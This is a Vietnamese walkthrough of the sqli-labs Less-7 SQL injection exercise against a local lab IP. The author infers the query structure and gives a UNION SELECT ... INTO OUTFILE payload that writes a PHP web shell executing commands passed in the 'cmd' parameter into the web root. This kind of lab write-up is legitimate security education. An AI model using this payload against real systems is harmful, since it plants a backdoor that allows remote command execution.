# Less 7

Đề yêu cầu nhập vào một giá trị ID

![](../images/sqli-labs/Less-7/01.png)

Nhập thử vào một vài giá trị 

![](../images/sqli-labs/Less-7/02.png)

Thử nhập vào một số giá trị khác để hiển thị lỗi

![](../images/sqli-labs/Less-7/03.png)

Chưa thấy báo lỗi tiếp tục thử

![](../images/sqli-labs/Less-7/04.png)

![](../images/sqli-labs/Less-7/07.png)

Như vậy ta thấy đã xảy ra lỗi. Nhưng ta thấy các một điều khác với các bài trước. Ở trong bài này nó không hiện ra lỗi cụ thể. Có thể người lập trình đã can thiệp vào các lỗi hiển thị ra. Như vậy ta rất khó để phán đoán và không thể đọc dữ liệu bằng cách làm cho nó lỗi.

Ta tiếp tục thử để xem có thể pass qua được gì từ câu query ở bên dưới hay không

Sau nhiều lần thử (và dựa vào kinh nghiệm từ các bài trước) tôi có thể đoán ra được câu query ở đây có thể là

```
select * from table where id=(('$ID')) limit 0,1
```

![](../images/sqli-labs/Less-7/08.png)

Nhưng ở đây ta không thể tận dụng điều này để hiển thị thông tin như ở những bài trước. Mà ở bài này ta chỉ có thể truyền vào server một đoạn code PHP 

```
http://192.168.84.233/sqli-labs/Less-7/?id=1')) union select 1,2,"<?php system($_REQUEST['cmd']);?>" INTO OUTFILE '/var/www/html/tests/1.php' --+
```

Ta thấy nó vẫn báo lỗi

![](../images/sqli-labs/Less-7/05.png)

Nhưng thực ra ta đã add thành công

![](../images/sqli-labs/Less-7/06.png)
